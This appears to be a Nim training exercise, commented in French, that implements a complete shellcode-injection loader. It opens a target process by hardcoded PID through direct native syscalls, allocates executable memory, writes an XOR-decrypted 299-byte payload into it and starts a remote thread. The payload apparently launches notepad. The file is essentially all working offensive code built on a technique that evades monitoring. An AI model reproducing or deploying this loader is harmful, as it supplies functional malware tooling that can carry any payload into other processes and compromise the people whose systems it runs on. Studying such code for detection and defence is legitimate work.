import winim/lean
include syscalls 

# Exercice basé sur l'exercice 3, ici on adopte une approche plus bas niveau avec l'utilisation de fonction natives 
# provenant de syscalls, équivalent aux fonctions précédemment utilisé lors des précédents exercices

proc xorByteSeq*(input: openArray[byte], key: int): seq[byte] {.noinline.} =
    let length = input.len
    var k = key
    result = newSeq[byte](length)
    for i in 0 ..< result.len:
        result[i] = uint8(input[i]) xor uint8(k)

proc injectShellcode[I, T](shellcode: array[I, T]): void =
    let processId: DWORD = 5196
    
    # Déclaration de variable nécéssaire pour l'API native
    var 
        bytesWritten: SIZE_T
        pcid: CLIENT_ID
        pHandle: HANDLE
        poa: OBJECT_ATTRIBUTES
        rPtr: LPVOID
        shellcode_size: SIZE_T = cast[SIZE_T](shellcode.len)
        status: WINBOOL
        tHandle: HANDLE


    pcid.UniqueProcess = cast[DWORD](processId)

    # Utilisation de NtOpenProcess (équivalent natif de OpenProcess) de syscalls
    status = NtOpenProcess(&pHandle, PROCESS_ALL_ACCESS, &poa, &pcid)

    # Ici on utilise l'équivalent natif de NtAllocateVirtualMemory pour allouer la mémoire
    status = NtAllocateVirtualMemory(pHandle, &rPtr, 0, &shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)

    # On déchiffre le payload comme d'habitude
    var decryptedShellcode = xorByteSeq(shellcode, 0x37)

    # Utilisation de NtWriteVirtualMemory (équivalent natif de WriteProcessMemory) pour écrire dans la mémoire attribuer
    status = NtWriteVirtualMemory(pHandle, rPtr, unsafeAddr decryptedShellcode[0], shellcode_size-1, addr bytesWritten)
 
    # Execution du thread
    status = NtCreateThreadEx(&tHandle, THREAD_ALL_ACCESS, NULL, pHandle, rPtr, NULL, FALSE, 0, 0, 0, NULL)

    # Nettoyage après injection
    discard NtClose(tHandle)
    discard NtClose(pHandle)

when defined(windows):
    const shellcode: array[299,byte] = [
    byte 0xcb, 0x7f, 0xb4, 0xd3, 0xc7, 0xdf, 0xf7, 0x37, 0x37, 0x37, 0x76, 0x66, 0x76, 0x67, 0x65,
    0x66, 0x61, 0x7f, 0x06, 0xe5, 0x52, 0x7f, 0xbc, 0x65, 0x57, 0x7f, 0xbc, 0x65, 0x2f, 0x7f,
    0xbc, 0x65, 0x17, 0x7f, 0xbc, 0x45, 0x67, 0x7f, 0x38, 0x80, 0x7d, 0x7d, 0x7a, 0x06, 0xfe,
    0x7f, 0x06, 0xf7, 0x9b, 0x0b, 0x56, 0x4b, 0x35, 0x1b, 0x17, 0x76, 0xf6, 0xfe, 0x3a, 0x76,
    0x36, 0xf6, 0xd5, 0xda, 0x65, 0x76, 0x66, 0x7f, 0xbc, 0x65, 0x17, 0xbc, 0x75, 0x0b, 0x7f,
    0x36, 0xe7, 0xbc, 0xb7, 0xbf, 0x37, 0x37, 0x37, 0x7f, 0xb2, 0xf7, 0x43, 0x50, 0x7f, 0x36,
    0xe7, 0x67, 0xbc, 0x7f, 0x2f, 0x73, 0xbc, 0x77, 0x17, 0x7e, 0x36, 0xe7, 0xd4, 0x61, 0x7f,
    0xc8, 0xfe, 0x76, 0xbc, 0x03, 0xbf, 0x7f, 0x36, 0xe1, 0x7a, 0x06, 0xfe, 0x7f, 0x06, 0xf7,
    0x9b, 0x76, 0xf6, 0xfe, 0x3a, 0x76, 0x36, 0xf6, 0x0f, 0xd7, 0x42, 0xc6, 0x7b, 0x34, 0x7b,
    0x13, 0x3f, 0x72, 0x0e, 0xe6, 0x42, 0xef, 0x6f, 0x73, 0xbc, 0x77, 0x13, 0x7e, 0x36, 0xe7,
    0x51, 0x76, 0xbc, 0x3b, 0x7f, 0x73, 0xbc, 0x77, 0x2b, 0x7e, 0x36, 0xe7, 0x76, 0xbc, 0x33,
    0xbf, 0x7f, 0x36, 0xe7, 0x76, 0x6f, 0x76, 0x6f, 0x69, 0x6e, 0x6d, 0x76, 0x6f, 0x76, 0x6e,
    0x76, 0x6d, 0x7f, 0xb4, 0xdb, 0x17, 0x76, 0x65, 0xc8, 0xd7, 0x6f, 0x76, 0x6e, 0x6d, 0x7f,
    0xbc, 0x25, 0xde, 0x60, 0xc8, 0xc8, 0xc8, 0x6a, 0x7f, 0x8d, 0x36, 0x37, 0x37, 0x37, 0x37,
    0x37, 0x37, 0x37, 0x7f, 0xba, 0xba, 0x36, 0x36, 0x37, 0x37, 0x76, 0x8d, 0x06, 0xbc, 0x58,
    0xb0, 0xc8, 0xe2, 0x8c, 0xd7, 0x2a, 0x1d, 0x3d, 0x76, 0x8d, 0x91, 0xa2, 0x8a, 0xaa, 0xc8,
    0xe2, 0x7f, 0xb4, 0xf3, 0x1f, 0x0b, 0x31, 0x4b, 0x3d, 0xb7, 0xcc, 0xd7, 0x42, 0x32, 0x8c,
    0x70, 0x24, 0x45, 0x58, 0x5d, 0x37, 0x6e, 0x76, 0xbe, 0xed, 0xc8, 0xe2, 0x74, 0x0d, 0x6b,
    0x40, 0x5e, 0x59, 0x53, 0x58, 0x40, 0x44, 0x6b, 0x44, 0x4e, 0x44, 0x43, 0x52, 0x5a, 0x04,
    0x05, 0x6b, 0x59, 0x58, 0x43, 0x52, 0x47, 0x56, 0x53, 0x19, 0x52, 0x4f, 0x52, 0x37 ]

    when isMainModule:
        injectShellcode(shellcode)